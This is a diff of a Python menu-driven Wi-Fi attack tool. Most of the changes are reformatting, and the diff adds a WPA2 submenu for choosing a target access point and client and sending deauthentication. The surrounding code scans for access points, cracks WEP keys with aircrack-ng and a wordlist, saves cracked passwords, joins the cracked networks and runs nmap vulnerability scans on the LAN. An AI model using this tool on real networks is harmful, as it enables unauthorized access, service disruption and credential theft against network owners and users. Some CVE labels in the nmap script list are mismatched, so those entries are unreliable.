@@ -7,10 +7,12 @@ import csv
 import os
 import re
 
+
 def check_root_user():
     if os.geteuid() != 0:
         print("This script must be run as root. Exiting.")
         sys.exit(1)
+
 
 def loading_prompt(message="", art=None):
     if art:
@@ -21,6 +23,7 @@ def loading_prompt(message="", art=None):
         time.sleep(1)
     print("\n")
 
+
 # Start up ASCII Art
 ascii_art = """
    ___  
@@ -29,6 +32,7 @@ ascii_art = """
 /_______\\\\
 \_______/
 """
+
 
 # MENU OPTIONS
 def menu_option_1():
@@ -40,7 +44,8 @@ def menu_option_1():
 
     def is_monitor_mode_enabled(interface):
         try:
-            result = subprocess.run(['iwconfig', interface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+            result = subprocess.run(['iwconfig', interface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+                                    text=True)
             output = result.stdout
             return "Mode:Monitor" in output
         except Exception as e:
@@ -50,7 +55,8 @@ def menu_option_1():
     def enable_monitor_mode(interface):
         try:
             print(f"Enabling monitoring mode on {interface}...")
-            result = subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            result = subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                    text=True)
             if is_monitor_mode_enabled(interface + 'mon'):
                 print(f"Monitoring mode enabled on {interface}mon")
                 return True
@@ -64,8 +70,9 @@ def menu_option_1():
     def run_airodump(interface):
         try:
             file_prefix = ensure_data_directory_exists() + "/airodump"
-            airodump_process = subprocess.Popen(['airodump-ng', '--write', file_prefix, '--output-format', 'csv', interface],
-                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            airodump_process = subprocess.Popen(
+                ['airodump-ng', '--write', file_prefix, '--output-format', 'csv', interface],
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             print("Airodump-ng is running... Press Ctrl+C to stop.")
             try:
                 airodump_process.wait()
@@ -102,7 +109,6 @@ def menu_option_1():
                 print(f"Extraction complete, all access points saved to {all_aps_filename}")
         except Exception as e:
             print(f"An error occurred: {e}")
-            
 
     def ask_for_scan(interface):
         response = input("Would you like to perform a scan with airodump-ng? (yes/no): ")
@@ -125,13 +131,14 @@ def menu_option_1():
             if enable_monitor_mode(interface):
                 ask_for_scan(mon_interface)
         else:
-            print("Exiting without enabling monitoring mode or scanning.")    
+            print("Exiting without enabling monitoring mode or scanning.")
+
 
 def menu_option_2():
     file_path = "/mnt/data/access_points.txt"
     # Initialize the PrettyTable with the specified headers
     table = PrettyTable(["ESSID", "ENC", "BSSID"])
-    
+
     try:
         # Open the file and read the contents using the csv.reader for parsing CSV formatted data
         with open(file_path, mode='r') as file:
@@ -140,12 +147,13 @@ def menu_option_2():
             for row in csv_reader:
                 bssid, enc, essid = row  # Unpack the row directly into variables
                 table.add_row([essid, enc, bssid])  # Add the data to the table
-                
+
         print(table)  # Display the table
     except FileNotFoundError:
         print(f"The file {file_path} was not found.")
     except Exception as e:
         print(f"An error occurred while reading the file: {e}")
+
 
 def menu_option_3():
     print("Crack WEP Access Points")
@@ -165,31 +173,32 @@ def menu_option_3():
         print(f"The file {file_path} was not found.")
     except Exception as e:
         print(f"An error occurred while analyzing vulnerabilities: {e}")
-    #Attempt to crack the WEP key using aircrack-ng
+    # Attempt to crack the WEP key using aircrack-ng
     for ap_row in wep_enabled_aps:
         ap = ap_row[2]
         print(f"Attempting to crack WEP key for {ap_row}...")
-        
-        try: #Replace the 2 directories with correct path to rockyou.txt or other wordlist, and the correct path to the packet capture file from airodump
-            result = subprocess.run(['sudo', 'aircrack-ng', '-b', ap, '-w', '/mnt/data/rockyou.txt', '/mnt/data/filename.cap'], capture_output = True, text = True)
-            if "KEY FOUND" in result.stdout: #Checks the output of the aircrack. If a key was found, store the results.
+
+        try:  # Replace the 2 directories with correct path to rockyou.txt or other wordlist, and the correct path to the packet capture file from airodump
+            result = subprocess.run(
+                ['sudo', 'aircrack-ng', '-b', ap, '-w', '/mnt/data/rockyou.txt', '/mnt/data/filename.cap'],
+                capture_output=True, text=True)
+            if "KEY FOUND" in result.stdout:  # Checks the output of the aircrack. If a key was found, store the results.
                 password = result.stdout.split("KEY FOUND! [ ")[1].split(" ]")[0]
-                ssid = ap 
+                ssid = ap
                 # Store cracked passwords
-                with open('/mnt/data/passwords.txt', 'a') as f: #Stores any found passwords and associated SSIDs to passwords.txt
+                with open('/mnt/data/passwords.txt',
+                          'a') as f:  # Stores any found passwords and associated SSIDs to passwords.txt
                     f.write(f"{ssid},{password}\n")
             else:
                 print("Key not found for", ap)
         except Exception as e:
             print("Error occurred:", e)
 
-def menu_option_4():
-    print("test")
-    
+
 # PIVOT MENU OPTIONS
 def submenu_option_1():
     passwords_file = "/mnt/data/passwords.txt"
-    
+
     # Check if the passwords file exists
     if not os.path.exists(passwords_file):
         print(f"The file {passwords_file} does not exist.")
@@ -198,19 +207,20 @@ def submenu_option_1():
     # Initialize a PrettyTable with headers
     table = PrettyTable()
     table.field_names = ["Index", "SSID", "Password"]
-    
+
     try:
         with open(passwords_file, 'r') as file:
             ssid_password_pairs = [line.strip().split(',') for line in file if line.strip()]
-        
+
         # Add each SSID and password pair to the table with an index
         for index, (ssid, password) in enumerate(ssid_password_pairs, start=1):
             table.add_row([index, ssid, password])
 
         print(table)
-    
+
     except Exception as e:
         print(f"An error occurred while reading the file: {e}")
+
 
 def submenu_option_2():
     passwords_file = "/mnt/data/passwords.txt"
@@ -247,11 +257,13 @@ def submenu_option_2():
     # Attempt to connect to the selected Wi-Fi network
     try:
         # Disconnect existing Wi-Fi connections to avoid conflicts
-        subprocess.run(['nmcli', 'device', 'disconnect', 'wlan0'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
+        subprocess.run(['nmcli', 'device', 'disconnect', 'wlan0'], check=True, stdout=subprocess.PIPE,
+                       stderr=subprocess.PIPE)
+
         print(f"Attempting to connect to Wi-Fi SSID: {ssid}")
-        connection_result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
+        connection_result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password],
+                                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
         if connection_result.returncode == 0:
             print(f"Successfully connected to {ssid}")
         else:
@@ -259,18 +271,23 @@ def submenu_option_2():
 
     except subprocess.CalledProcessError as e:
         print(f"An error occurred while trying to connect to the Wi-Fi: {e}")
-    
+
+
 def submenu_option_3():
     print("Enumerate LAN")
     enumerate_lan()
 
+
 # NAVIGATION
 def menu_to_pivot():
-    print("Pivot Menu")
     display_pivot()
+
+def menu_to_wpa2():
+    attacking_wpa2()
 
 def exit_menu():
     print("Exiting menu...")
+
 
 def display_menu():
     # Define menu options here. Add new options by appending to this list.
@@ -278,17 +295,17 @@ def display_menu():
         {"label": "Access Point Enumeration", "function": menu_option_1},
         {"label": "List Discovered Access Points", "function": menu_option_2},
         {"label": "Crack WEP", "function": menu_option_3},
-        {"label": "Attacking WPA/2", "function": menu_option_4},
+        {"label": "Attacking WPA/2", "function": menu_to_wpa2},
         {"label": "Pivot", "function": menu_to_pivot},
         {"label": "Analyze Vulnerabilities", "function": analyze_vulnerabilities},
         {"label": "Exit", "function": exit_menu},
     ]
-    
+
     while True:
         print("\nMenu:")
         for i, option in enumerate(menu_options, start=1):
             print(f"{i}. {option['label']}")
-        
+
         try:
             choice = int(input("Select an option: "))
             if 1 <= choice <= len(menu_options):
@@ -303,6 +320,46 @@ def display_menu():
             print("\nExiting due to Ctrl+C")
             break
 
+
+def attacking_wpa2():
+    target_ap = " "
+    target_c = " "
+
+    def target_accesspoint():
+        nonlocal target_ap
+        target_ap = wpa2.target_ap()
+        print("\nNew Target Access Point: ", target_ap)
+
+    def target_client():
+        nonlocal target_c
+        target_c = wpa2.target_c()
+        print("\nNew Target Client: ", target_c)
+
+    submenu_options = [
+        {"label": "Set Target Access Point", "function": target_accesspoint},
+        {"label": "Identify Potential Clients", "function": wpa2.identify_clients},
+        {"label": "Set Target Client", "function": target_client},
+        {"label": "Deauth Client", "function": wpa2.deauth},
+        {"label": "Return To Main Menu", "function": exit_menu},
+    ]
+
+    while True:
+        print("\nAttacking WPA2:")
+        print("Target Access Point:", target_ap)
+        print("Target Client:", target_c, "\n")
+
+        for i, option in enumerate(submenu_options, start=1):
+            print(f"{i}. {option['label']}")
+
+        choice = int(input("Select an option: "))
+        if 1 <= choice <= len(submenu_options):
+            submenu_options[choice - 1]["function"]()
+            if submenu_options[choice - 1]["label"] == "Return To Main Menu":
+                break
+        else:
+            print("Invalid option, please try again.")
+
+
 def display_pivot():
     submenu_options = [
         {"label": "List Cracked Passwords", "function": submenu_option_1},
@@ -310,12 +367,12 @@ def display_pivot():
         {"label": "Enumerate LAN", "function": submenu_option_3},
         {"label": "Exit Pivot Menu", "function": exit_menu},
     ]
-    
+
     while True:
         print("\nPivot:")
         for i, option in enumerate(submenu_options, start=1):
             print(f"{i}. {option['label']}")
-        
+
         choice = int(input("Select an option: "))
         if 1 <= choice <= len(submenu_options):
             submenu_options[choice - 1]["function"]()
@@ -323,7 +380,8 @@ def display_pivot():
                 break
         else:
             print("Invalid option, please try again.")
-            
+
+
 def analyze_vulnerabilities():
     file_path = "/mnt/data/access_points.txt"
     try:
@@ -345,6 +403,7 @@ def analyze_vulnerabilities():
         print(f"The file {file_path} was not found.")
     except Exception as e:
         print(f"An error occurred while analyzing vulnerabilities: {e}")
+
 
 def enumerate_lan():
     print("LAN Enumeration Options:")
@@ -371,6 +430,7 @@ def enumerate_lan():
         except ValueError:
             print("Please enter a number.")
 
+
 def basic_lan_scan():
     target = input("Enter target IP or range (e.g., 192.168.1.1/24): ")
     print(f"Scanning {target}...")
@@ -378,6 +438,7 @@ def basic_lan_scan():
         subprocess.run(['nmap', target], check=True)
     except subprocess.CalledProcessError as e:
         print(f"An error occurred during the scan: {e}")
+
 
 def scan_for_vulnerabilities():
     target = input("Enter target IP or range for vulnerability scan: ")
@@ -387,34 +448,39 @@ def scan_for_vulnerabilities():
     except subprocess.CalledProcessError as e:
         print(f"An error occurred during the vulnerability scan: {e}")
 
+
 def list_nmap_script_options():
     # List of commonly used Nmap scripts and their descriptions
     nmap_scripts = [
         {"script": "vuln", "description": "General vulnerability scanning"},
         {"script": "smb-vuln-ms17-010", "description": "Check for EternalBlue vulnerability (MS17-010)"},
         {"script": "http-heartbleed", "description": "Test for Heartbleed vulnerability in SSL/TLS"},
-        {"script": "smb-vuln-cve-2017-5689", "description": "Check for Intel AMT security vulnerability (CVE-2017-5689)"},
+        {"script": "smb-vuln-cve-2017-5689",
+         "description": "Check for Intel AMT security vulnerability (CVE-2017-5689)"},
         {"script": "rdp-vuln-ms12-020", "description": "Check for vulnerabilities in Microsoft RDP (CVE-2019-0708)"},
-        {"script": "smb-vuln-cve-2020-0796", "description": "Check for SMBGhost vulnerability in SMBv3 (CVE-2020-0796)"},
+        {"script": "smb-vuln-cve-2020-0796",
+         "description": "Check for SMBGhost vulnerability in SMBv3 (CVE-2020-0796)"},
         {"script": "ssh-vuln-cve-2018-10933", "description": "Check for vulnerability in libssh (CVE-2018-10933)"},
         {"script": "http-title", "description": "Get the title of the web server's default page"},
         {"script": "ssl-enum-ciphers", "description": "Enumerate SSL/TLS ciphers and protocols"},
         {"script": "smb-os-discovery", "description": "Discover OS, computer name, and more over SMB"},
         {"script": "dns-zone-transfer", "description": "Attempt a DNS zone transfer"},
         {"script": "broadcast-dhcp-discover", "description": "Discover DHCP servers in the local network"},
-        {"script": "mysql-vuln-cve2012-2122", "description": "Check for MySQL auth bypass vulnerability (CVE-2012-2122)"},
+        {"script": "mysql-vuln-cve2012-2122",
+         "description": "Check for MySQL auth bypass vulnerability (CVE-2012-2122)"},
         {"script": "ssh2-enum-algos", "description": "Enumerate SSH protocol 2 algorithms supported by the server"},
     ]
 
     print("Available Nmap Script Options:")
     for i, script in enumerate(nmap_scripts, start=1):
         print(f"{i}. {script['script']} - {script['description']}")
-    
+
     return nmap_scripts
+
 
 def custom_nmap_script_scan():
     nmap_scripts = list_nmap_script_options()  # Display script options and get the list
-    
+
     script_choice = input("Select a script by number or enter script name directly: ")
     try:
         script_choice = int(script_choice) - 1
@@ -446,6 +512,7 @@ def custom_nmap_script_scan():
         print("Scan complete.")
     except subprocess.CalledProcessError as e:
         print(f"An error occurred during the custom script scan: {e}")
+
 
 vulnerabilities_info = {
     "smb-vuln-ms17-010": {
